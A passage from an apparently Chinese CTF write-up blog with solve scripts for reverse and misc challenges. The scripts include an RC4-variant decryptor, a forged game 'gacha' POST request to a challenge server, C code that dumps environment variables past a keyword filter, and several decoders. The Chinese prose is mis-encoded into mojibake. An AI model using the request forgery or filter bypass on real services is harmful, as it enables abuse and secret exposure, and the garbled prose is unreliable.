class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t] ^ i)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;Please input your key:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(key) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;wrong!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&quot;Please input your msg:&quot;</span>)</span><br><span class="line">    box = init(key)</span><br><span class="line">    encode = encrypt(msg, box)</span><br><span class="line">    string1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;YRiAOe4PlGvxaCoNj2ZgX+q8t/5Em6IUpM9FrVb7BKwsT1n3fSydhDWuQHJ0ckzL&#x27;</span></span><br><span class="line">    encode = b64encode(<span class="built_in">bytes</span>(encode)).decode().translate(<span class="built_in">str</span>.maketrans(string1, string2))</span><br><span class="line">    <span class="keyword">if</span> encode == <span class="string">&#x27;mWGFL24R/RSZY3pzK9H4FOmFOnXJKyCjXWbZ7Ijy11GbCBukDrjsiPPFiYB=&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congraduation!You get the right flag!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸ºäº†æ··æ·†å†™äº†å‡ ä¸ªæ²¡æœ‰ç”¨ä¸Šçš„å‡½æ•°ï¼Œè¿™é‡Œ<strong>åªç”¨åˆ°äº†checkï¼Œinitï¼Œenctyptè¿™ä¸‰ä¸ªå‡½æ•°</strong></p><p>æ˜¾ç„¶æ˜¯ä¸€ä¸ªRC4åŠ å¯†ï¼ˆå˜ç§ï¼Œä½†æ˜¯æ€è·¯è¿˜æ˜¯ä¸€æ ·ï¼ŒåŠ è§£å¯†ä¸€æ ·ï¼‰</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, msg</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[j], s_box[i] = s_box[i], s_box[j]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t] ^ i)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">string1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&#x27;YRiAOe4PlGvxaCoNj2ZgX+q8t/5Em6IUpM9FrVb7BKwsT1n3fSydhDWuQHJ0ckzL&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;mWGFL24R/RSZY3pzK9H4FOmFOnXJKyCjXWbZ7Ijy11GbCBukDrjsiPPFiYB=&#x27;</span></span><br><span class="line">enc = b64decode(enc.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line">x = [<span class="number">78</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">80</span>, <span class="number">67</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">96</span>, <span class="number">56</span>, <span class="number">121</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">44</span>, <span class="number">126</span>, <span class="number">103</span>]</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    key.append(<span class="built_in">chr</span>(x[i] ^ i))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(key))</span><br><span class="line"></span><br><span class="line">flag = rc4(key, enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment"># NSSCTF&#123;eda20db6-3cff-6125-f6ca-1a155bd3292c&#125;</span></span><br></pre></td></tr></table></figure><h1 id="SekaiCTF"><a href="#SekaiCTF" class="headerlink" title="SekaiCTF"></a>SekaiCTF</h1><p>åªçœ‹äº†ä¸€é“reï¼Œ<del>æ‰“nsså»äº†</del></p><ul><li><em>re-Asusawaâ€™a Gacha World(finish)</em></li></ul><h2 id="Re-Asusawaâ€™a-Gacha-World"><a href="#Re-Asusawaâ€™a-Gacha-World" class="headerlink" title="Re-Asusawaâ€™a Gacha World"></a>Re-Asusawaâ€™a Gacha World</h2><p>u3dé€†å‘ï¼Œå…ˆæ‰¾Assembly CSharp.dllç”¨dotpeekæ‰“å¼€</p><p>åœ¨characteré‡Œé¢æ‰¾åˆ°flagï¼ŒæŸ¥çœ‹å¼•ç”¨å‘ç°4æ˜Ÿå¡ä¼šæœ‰flag</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_4star.png" alt="4star" style="zoom:80%;"><p>ç„¶åç»§ç»­æ‰¾å¼•ç”¨ï¼Œå‘ç°æŠ½å¡ä¸åœ¨æœ¬åœ°ï¼Œæ¯æ¬¡æŠ½å¡æ˜¯è¦å‘é€postè¯·æ±‚ï¼Œ</p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯ä¼ªé€ æŠ½å¡è¯·æ±‚ï¼Œç„¶åæŠ½åˆ°4æ˜Ÿå¡ï¼Œè·å¾—flagã€‚</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_post.png"><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://172.86.64.89:3000/gacha&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;SekaiCTF&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json = &#123;</span><br><span class="line">    <span class="string">&#x27;crystals&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">&#x27;numPulls&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;pulls&#x27;</span>: <span class="number">999999</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(url, headers=headers, json=json)</span><br><span class="line">res = r.json()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ä¸€æ®µbase64ï¼Œè§£ç å¾—åˆ°flagå›¾ç‰‡</p><p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_flag.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Rev </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2023_WP</title>
      <link href="/NepCTF2023-WP/"/>
      <url>/NepCTF2023-WP/</url>
      
        <content type="html"><![CDATA[<p><strong>æ¯”èµ›è¯¦æƒ…ï¼šmisc(7&#x2F;9), pwn(1&#x2F;9)</strong></p><p><del>å·²ç»ä»äºŒè¿›åˆ¶æ‰‹å˜æˆmiscæ‰‹äº†ï¼Œæ‚²</del></p><p><img src="/NepCTF2023-WP/image-20230813192419049.png" alt="æ’å"></p><span id="more"></span><h1 id="misc-codes"><a href="#misc-codes" class="headerlink" title="misc-codes"></a>misc-codes</h1><p>é¢˜ç›®æç¤ºflagåœ¨ç¯å¢ƒå˜é‡å†…ï¼Œæ‰€ä»¥æœ¬é¢˜ç›®çš„æ˜¯ï¼šç¼–å†™èƒ½è·å–å¹¶è¾“å‡ºç¯å¢ƒå˜é‡çš„Cè¯­è¨€ä»£ç ã€‚</p><p>ç»è¿‡ä¸æ–­è¯•é”™ï¼Œå‘ç°getenvï¼ˆï¼‰ï¼Œmainï¼ˆint argc, char* args[], char* envp[])ç­‰å¸¸ç”¨çš„æ–¹æ³•å‡ä¸èƒ½é€šè¿‡ã€‚</p><p>æ‰€ä»¥åˆç†æ¨æµ‹æ˜¯æŠŠenvè¿™ä¸ªè¯banäº†ï¼ŒæŠŠmainç¬¬ä¸‰ä¸ªå‚æ•°åenvpæ”¹æˆeå°±å¯ä»¥è¾“å‡ºäº†</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* args[], <span class="type">char</span>* e[])</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; e[i] != <span class="literal">NULL</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, e[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/NepCTF2023-WP/image-20230813193450003.png" alt="output" style="zoom:67%;"><h1 id="misc-ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"><a href="#misc-ä¸AIå…±èˆçš„å“ˆå¤«æ›¼" class="headerlink" title="misc-ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"></a>misc-ä¸AIå…±èˆçš„å“ˆå¤«æ›¼</h1><p>ç»™äº†ä¸€ä¸ªç»è¿‡å“ˆå¤«æ›¼å‹ç¼©ç®—æ³•å‹ç¼©åçš„æ–‡ä»¶ï¼Œç›´æ¥ç”¨copilotç”Ÿæˆè§£å‹ä»£ç äº†<del>(æ¯•ç«Ÿä¸æ˜¯è¯´ä¸aiå…±èˆå˜›)</del></p><p>ä¸è¿‡ç”Ÿæˆçš„æœ‰ç‚¹é—®é¢˜ï¼Œè¾“å‡ºçš„è§£å‹æ–‡ä»¶æ˜¯ç©ºçš„ï¼Œæ‰‹åŠ¨æ”¹äº†ä¸€äº›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read frequency information</span></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    num_of_freq = data[<span class="number">0</span>]</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_of_freq):</span><br><span class="line">        byte = data[index]</span><br><span class="line">        freq = (data[index+<span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | (data[index+<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (data[index+<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | data[index+<span class="number">4</span>]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        index += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read compressed data</span></span><br><span class="line">    padding = data[index]</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    dat = data[index:]</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> dat:</span><br><span class="line">        byte = <span class="built_in">bin</span>(byte)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        compressed_data += byte</span><br><span class="line"></span><br><span class="line">    <span class="comment">#compressed_data = compressed_data[:-padding]</span></span><br><span class="line"></span><br><span class="line">    node_now = root</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> compressed_data:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            node_now = node_now.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node_now = node_now.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> node_now.left <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> node_now.right <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            result += <span class="built_in">bytes</span>([node_now.char])</span><br><span class="line">            node_now = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br></pre></td></tr></table></figure><p><img src="/NepCTF2023-WP/image-20230813194208176.png" alt="huffman_decompressed"></p><p>è™½ç„¶è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œä¸è¿‡å·²ç»ä¸å¦¨ç¢å¾—åˆ°ç»“æœäº†ï¼ˆï¼‰</p><p>NepCTF{huffman_zip_666}</p><h1 id="misc-ConnectedFive"><a href="#misc-ConnectedFive" class="headerlink" title="misc-ConnectedFive"></a>misc-ConnectedFive</h1><p>ä¸‡å®äº”å­æ£‹ï¼Œä¸å¥½è¯„ä»·ï¼ˆ</p><p>ç›´æ¥ç©è¿‡å»å°±å¥½äº†ï¼ˆï¼‰</p><p>ï¼ˆä¸æƒ³å†ç©ä¸€æ¬¡äº†ï¼Œå°±ä¸æ”¾æˆªå›¾äº†å§ï¼Œ42æ¬¡ä¹Ÿå¤ªå¤šäº†ï¼‰</p><h1 id="misc-CheckIn"><a href="#misc-CheckIn" class="headerlink" title="misc-CheckIn"></a>misc-CheckIn</h1><p>ç­¾åˆ°ï¼Œé¢˜ç›®ç»™äº†flag</p><p><img src="/NepCTF2023-WP/image-20230813204100990.png" alt="checkin"></p><h1 id="misc-é™Œç”Ÿçš„è¯­è¨€"><a href="#misc-é™Œç”Ÿçš„è¯­è¨€" class="headerlink" title="misc-é™Œç”Ÿçš„è¯­è¨€"></a>misc-é™Œç”Ÿçš„è¯­è¨€</h1><p>å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ï¼š</p><img src="/NepCTF2023-WP/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg" alt="é™Œç”Ÿçš„çº¸æ¡" style="zoom: 25%;"><p>æç¤ºäº†é¢˜ç›®ä¸­AåŒå­¦æ˜¯Atsuko Kagariï¼ŒæŸ¥äº†ä¸€ä¸‹æ˜¯ã€Šå°é­”å¥³å­¦å›­ã€‹çš„ï¼Œæ˜¾ç„¶å›¾ä¸­çš„ä¸¤ç§è¯­è¨€åº”è¯¥å‡ºè‡ªè¯¥ä½œå“ã€‚æœ€åæŸ¥æ‰¾ç¡®å®šäº†ä¸Šä¸‹åˆ†åˆ«æ˜¯å¤ä»£é¾™è¯­å’Œéœ²å¨œæ–‡</p><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†å¯¹åº”çš„ç è¡¨</p><p><img src="/NepCTF2023-WP/%E9%BE%99%E8%AF%AD.jpeg" alt="é¾™è¯­"></p><img src="/NepCTF2023-WP/luna_alphabet.jpg" alt="luna_alphabet" style="zoom: 67%;"><p>åˆ†åˆ«å¾—åˆ°äº†nepnep a believingï¼Œå’Œheart is your magic</p><p>æç¤ºflagæ ¼å¼å‡­è¯­æ³•æ–­å¥ï¼Œç„¶åå¤§å°å†™éƒ½è¯•ä¸€ä¸‹ï¼Œå¾—åˆ°flagæ˜¯:</p><p>NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p><h1 id="misc-å°å®å¼¹é’¢ç´"><a href="#misc-å°å®å¼¹é’¢ç´" class="headerlink" title="misc-å°å®å¼¹é’¢ç´"></a>misc-å°å®å¼¹é’¢ç´</h1><p>å¾—åˆ°ä¸€ä¸ªpiano.midæ–‡ä»¶ï¼Œå¬äº†ä¸€ä¼šï¼Œå‘ç°å¯èƒ½æœ‰æ‘©æ–¯å¯†ç </p><p>ç”¨Audacityæ‰“å¼€ï¼š</p><img src="/NepCTF2023-WP/image-20230813195608858.png" alt="mose" style="zoom:80%;"><img src="/NepCTF2023-WP/image-20230813195622754.png" alt="xor_data" style="zoom:80%;"><p>å‘ç°ä¸€åŠæ˜¯æ‘©æ–¯ï¼Œå¦ä¸€åŠå¯ä»¥ä¾§è¿‡æ¥çœ‹æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„16è¿›åˆ¶æ•°ï¼Œè¯»å‡ºæ¥ç»“æœå¦‚ä¸‹ï¼š</p><p>-.â€“&#x2F;â€”&#x2F;..-&#x2F;â€¦&#x2F;â€¦.&#x2F;â€”&#x2F;..-&#x2F;.-..&#x2F;-..&#x2F;..-&#x2F;â€¦&#x2F;.&#x2F;-&#x2F;â€¦.&#x2F;..&#x2F;â€¦&#x2F;-&#x2F;â€”&#x2F;-..-&#x2F;â€”&#x2F;.-.&#x2F;â€¦&#x2F;â€”&#x2F;â€“&#x2F;.&#x2F;-&#x2F;â€¦.&#x2F;..&#x2F;-.&#x2F;â€“.</p><p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p><p>æŠŠæ‘©æ–¯å¯†ç è§£å¯†å¾—åˆ°YOU SHOULD USE THIS TO XOR SOMETHING</p><p>æ˜¾ç„¶è¦ç”¨è¿™æ®µè‹±æ–‡xoråˆšæ‰çš„16è¿›åˆ¶æ•°</p><p>å‘ç°è¿™ä¸ª16è¿›åˆ¶æ•°æœ‰30å­—èŠ‚ï¼Œæ‘©æ–¯å¯†ç æ˜æ–‡ä¹Ÿæ˜¯30ä¸ªå­—ç¬¦ï¼ˆä¸ç®—ç©ºæ ¼ï¼‰</p><p>æ‰€ä»¥é€é¡¹å¼‚æˆ–å¾—åˆ°ç­”æ¡ˆï¼ˆè¿™é‡Œå¤§å°å†™éƒ½è¯•äº†ï¼Œå°å†™å¯ä»¥ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&#x27;</span></span><br><span class="line">xor = <span class="string">&#x27;youshouldusethistoxorsomething&#x27;</span></span><br><span class="line">xor_a = [<span class="built_in">int</span>(a[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_a)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor_a[i] ^ <span class="built_in">ord</span>(xor[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>NepCTF&#123;h4ppy_p14N0&#125;NepCTF&#123;h4pp</code></p><h1 id="misc-ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ"><a href="#misc-ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ" class="headerlink" title="misc-ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ"></a>misc-ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ</h1><p>å¾—åˆ°çš„txté™„ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">salt<span class="emphasis">_lenth= 10 </span></span><br><span class="line"><span class="emphasis">key_</span>lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #åŸå§‹ivè½¬hexçš„å€¼</span><br><span class="line">ciphertext= </span><br><span class="line">b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯ä¸€ä¸ªAESåŠ å¯†ï¼Œè¿™é‡Œè‚¯å®šè¦å…ˆè§£å‡ºsaltå’Œkey</p><img src="/NepCTF2023-WP/image-20230813200653505.png" alt="image-20230813200653505" style="zoom:80%;"><p>æ²¡ä»€ä¹ˆå¤´ç»ªï¼Œæ‰€ä»¥å›å»é‡æ–°çœ‹é¢˜ï¼Œå‘ç°äº†ä¸€äº›ç«¯å€ªï¼š</p><ul><li>è¿™ç¾¤åçœ‹èµ·æ¥æ€ªæ€ªçš„ï¼Œâ€¦ï¼Œå¥½å’¸è¯¶ &#x3D;&gt; æ¨æµ‹å‡ºç¾¤åæ˜¯ç›ï¼Œä¹Ÿå°±æ˜¯salt&#x3D;NepCTF2023</li><li>è¿™éœ€è¦ç»è¿‡å•¥256å¤„ç†ä¸€ä¸‹æ‰èƒ½å¾—åˆ°è§£é¢˜çš„å…³é”® &#x3D;&gt; å•¥çš„æ‹¼éŸ³æ˜¯shaï¼Œæ‰€ä»¥æ¨æµ‹è¦æŠŠsaltç”¨sha256åŠ å¯†ï¼Œå¾—åˆ°å…³é”®ï¼ˆåˆç†æ¨æµ‹å°±æ˜¯keyäº†ï¼‰</li></ul><p>å¾—åˆ°sha256ï¼ˆsaltï¼‰&#x3D; dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</p><p>å› ä¸ºé™„ä»¶é‡Œè¯´keyæ˜¯16ä½ï¼Œæ‰€ä»¥è¯•äº†ä¸€ä¸‹æˆªå‰16å­—èŠ‚ä½œä¸ºkeyæ¥è§£aes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009&#x27;</span></span><br><span class="line">iv_hex = <span class="string">&#x27;88219bdee9c396eca3c637c0ea436058&#x27;</span> <span class="comment">#åŸå§‹ivè½¬hexçš„å€¼</span></span><br><span class="line">ciphertext= <span class="string">&#x27;&#x27;&#x27;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠŠhexå€¼è½¬æˆbytes</span></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv_hex)</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)[:<span class="number">16</span>]</span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plaintext = aes.decrypt(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;plaintext:&#x27;</span>, plaintext)</span><br><span class="line"><span class="comment"># plaintext: b&#x27;6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d&#x27;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æ˜æ–‡æ‹¿å»è§£base16ï¼Œç„¶åå†è§£base64å¾—åˆ°</p><p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p>æŠŠå›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼š</p><img src="/NepCTF2023-WP/yOkXWSJT.png" alt="yOkXWSJT" style="zoom: 